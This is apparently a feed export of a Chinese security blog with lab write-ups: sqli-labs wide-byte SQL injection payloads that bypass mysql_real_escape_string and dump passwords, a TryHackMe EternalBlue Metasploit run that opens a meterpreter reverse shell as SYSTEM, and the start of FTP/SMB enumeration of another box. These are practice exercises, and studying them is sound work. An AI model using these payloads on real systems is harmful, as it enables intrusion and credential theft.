-</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103112599.png" class><h2 id="0x20-Less-36-GET-绕过Mysql-real-escape-string"><a href="#0x20-Less-36-GET-绕过Mysql-real-escape-string" class="headerlink" title="0x20.Less-36 GET 绕过Mysql_real_escape_string"></a>0x20.Less-36 GET 绕过Mysql_real_escape_string</h2><blockquote><p> 查看源码发现，参数会被mysql_real_escape_string转义</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= mysql_real_escape_string($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>定义和用法</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">下列字符受影响：</span><br><span class="line"></span><br><span class="line"> \x00</span><br><span class="line"> \n</span><br><span class="line"> \r</span><br><span class="line"> \</span><br><span class="line"> &#x27;</span><br><span class="line"> &quot;</span><br><span class="line"> \x1a</span><br><span class="line"></span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 语法</span></span><br><span class="line"></span><br><span class="line">mysql_real_escape_string(string,connection)</span><br><span class="line"></span><br><span class="line">| 参数       | 描述                                                  |</span><br><span class="line">| :--------- | :---------------------------------------------------- |</span><br><span class="line">| string     | 必需。规定要转义的字符串。                            |</span><br><span class="line">| connection | 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。 |</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 说明</span></span><br></pre></td></tr></table></figure><p>本函数将 <em>string</em> 中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于 <span class="exturl" data-url="aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX215c3FsX3F1ZXJ5LmFzcA==">mysql_query()<i class="fa fa-external-link-alt"></i></span>。</p><p><code>测试闭合字符，结果为单引号</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1%e4&#x27; and 1=1 -- -</span><br><span class="line">?id=1%e4&#x27; and 1=2 -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103932605.png" class><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119104044212.png" class><p><code>其他过程同上</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%e4&#x27; union select 1,group_concat(username,0x7e,password),3 from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119103818736.png" class><h2 id="0x21-Less-37-POST-绕过Mysql-real-escape-string"><a href="#0x21-Less-37-POST-绕过Mysql-real-escape-string" class="headerlink" title="0x21.Less-37 POST 绕过Mysql_real_escape_string"></a>0x21.Less-37 POST 绕过Mysql_real_escape_string</h2><p><code>与上一题一样</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = mysql_real_escape_string($uname1);</span><br><span class="line">$passwd= mysql_real_escape_string($passwd1);</span><br></pre></td></tr></table></figure><p><code>按照上一题的方法，但是结果并不是我想象的那样，闭合字符怎么也找不到，于是抓包发现%会被编码为%25</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119111554948.png" class><p><code>所以可以将%25换为%</code></p><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119111930781.png" class><p><code>其他过程同上</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%e4%27 union select 1,group_concat(username,0x7e,password) from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119112040350.png" class>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Sqli_labs_Page2(advance)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;skip:基础篇环境为windows，但在提高篇有些关卡会出现解析错误，本篇使用docker搭建的Linux环境&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/categories/Sqli-labs/"/>
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/tags/Sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>tryhackme-[blue]</title>
    <link href="https://lunamoore.github.io/2021/01/15/tryhackme-blue/"/>
    <id>https://lunamoore.github.io/2021/01/15/tryhackme-blue/</id>
    <published>2021-01-15T11:53:54.000Z</published>
    <updated>2021-01-15T11:56:55.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Demo"><a href="#0x01-Demo" class="headerlink" title="0x01.Demo"></a>0x01.Demo</h2><img src="/2021/01/15/tryhackme-blue/image-20210115194912000.png" class><a id="more"></a><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02.信息收集"></a>0x02.信息收集</h2><p><code>看到了ms17-010(永恒之蓝)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/blue# nmap -sC -vv --script=vuln 10.10.246.255 -oN nmap.demo</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-15 05:38 EST</span><br><span class="line">NSE: Loaded 105 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:38</span><br><span class="line">Completed NSE at 05:38, 10.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:38</span><br><span class="line">Completed NSE at 05:38, 0.00s elapsed</span><br><span class="line">Initiating Ping Scan at 05:38</span><br><span class="line">Scanning 10.10.246.255 [4 ports]</span><br><span class="line">Completed Ping Scan at 05:38, 0.30s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 05:38</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 05:38, 0.02s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 05:38</span><br><span class="line">Scanning 10.10.246.255 [1000 ports]</span><br><span class="line">Discovered open port 445/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 3389/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 139/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 135/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49154/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49159/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49153/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49158/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49152/tcp on 10.10.246.255</span><br><span class="line">Completed SYN Stealth Scan at 05:39, 46.22s elapsed (1000 total ports)</span><br><span class="line">NSE: Script scanning 10.10.246.255.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:39</span><br><span class="line">NSE: [ssl-ccs-injection 10.10.246.255:3389] No response from server: ERROR</span><br><span class="line">NSE Timing: About 88.47% done; ETC: 05:39 (0:00:04 remaining)</span><br><span class="line">NSE Timing: About 89.08% done; ETC: 05:40 (0:00:07 remaining)</span><br><span class="line">Completed NSE at 05:40, 90.23s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">Nmap scan report for 10.10.246.255</span><br><span class="line">Host is up, received echo-reply ttl 127 (0.25s latency).</span><br><span class="line">Scanned at 2021-01-15 05:38:32 EST for 136s</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">Reason: 991 resets</span><br><span class="line">PORT      STATE SERVICE       REASON</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127</span><br><span class="line">445/tcp   open  microsoft-ds  syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127</span><br><span class="line">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">49152/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49153/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49154/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49158/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49159/tcp open  unknown       syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 147.23 seconds</span><br><span class="line">           Raw packets sent: 1189 (52.292KB) | Rcvd: 1066 (42.672KB)</span><br><span class="line">root@JIYE:~/tryhackme/blue#</span><br></pre></td></tr></table></figure><h2 id="0x03-MSF直接利用"><a href="#0x03-MSF直接利用" class="headerlink" title="0x03.MSF直接利用"></a>0x03.MSF直接利用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.246.255</span><br><span class="line">rhosts =&gt; 10.10.246.255</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 10.9.248.83</span><br><span class="line">lhost =&gt; 10.9.248.83</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         10.10.246.255    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.9.248.83      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.9.248.83:4444 </span><br><span class="line">[*] 10.10.246.255:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.246.255:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.246.255:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.246.255:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.246.255:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.246.255:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.246.255:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.246.255:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.246.255:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.246.255:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.246.255:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.246.255:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.246.255:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.246.255:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.246.255:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.246.255:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.246.255:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.246.255:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.246.255:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.10.246.255</span><br><span class="line">[*] Meterpreter session 1 opened (10.9.248.83:4444 -&gt; 10.10.246.255:49201) at 2021-01-15 05:54:08 -0500</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-Demo&quot;&gt;&lt;a href=&quot;#0x01-Demo&quot; class=&quot;headerlink&quot; title=&quot;0x01.Demo&quot;&gt;&lt;/a&gt;0x01.Demo&lt;/h2&gt;&lt;img src=&quot;/2021/01/15/tryhackme-blue/image-20210115194912000.png&quot; class&gt;</summary>
    
    
    
    <category term="Tryhackme" scheme="https://lunamoore.github.io/categories/Tryhackme/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>tryhackme-[Anonymous]</title>
    <link href="https://lunamoore.github.io/2021/01/13/tryhackme-Anonymous/"/>
    <id>https://lunamoore.github.io/2021/01/13/tryhackme-Anonymous/</id>
    <published>2021-01-13T06:58:12.000Z</published>
    <updated>2021-01-13T07:01:13.189Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Demo"><a href="#0x01-Demo" class="headerlink" title="0x01.Demo"></a>0x01.Demo</h2><img src="/2021/01/13/tryhackme-Anonymous/image-20210113134507401.png" class><a id="more"></a><h2 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02.信息收集"></a>0x02.信息收集</h2><p><code>可以看到开放了4个端口21/22/139/445 其中ftp开放了匿名登入，且目录为scripts</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# nmap -sC -sV -sT 10.10.7.51 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-13 00:46 EST</span><br><span class="line">Nmap scan report for 10.10.7.51</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.9.248.83</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 5</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)</span><br><span class="line">|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)</span><br><span class="line">|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1s, deviation: 2s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: anonymous</span><br><span class="line">|   NetBIOS computer name: ANONYMOUS\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: anonymous</span><br><span class="line">|_  System time: 2021-01-13T05:48:13+00:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-01-13T05:48:11</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 157.83 seconds</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure><p><code>查看服务共享的资源，发现为pics</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# smbclient -L 10.10.7.51</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        pics            Disk      My SMB Share Directory for Pics</span><br><span class="line">        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure><h2 id="0x03-匿名登入ftp"><a href="#0x03-匿名登入ftp" class="headerlink" title="0x03.匿名登入ftp"></a>0x03.匿名登入ftp</h2><p><code>发现scripts目录下的文件，并下载</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# ftp 10.10.7.51</span><br><span class="line">Connected to 10.10.7.51.</span><br><span class="line">220 NamelessOne&#x27;s FTP Server!</span><br><span class="line">Name (10.10.7.51:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">cd</span> scripts</span></span><br><span class="line">250 Directory successfully changed.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh</span><br><span class="line">-rw-rw-r--    1 1000     1000          946 Jan 13 05:47 removed_files.log</span><br><span 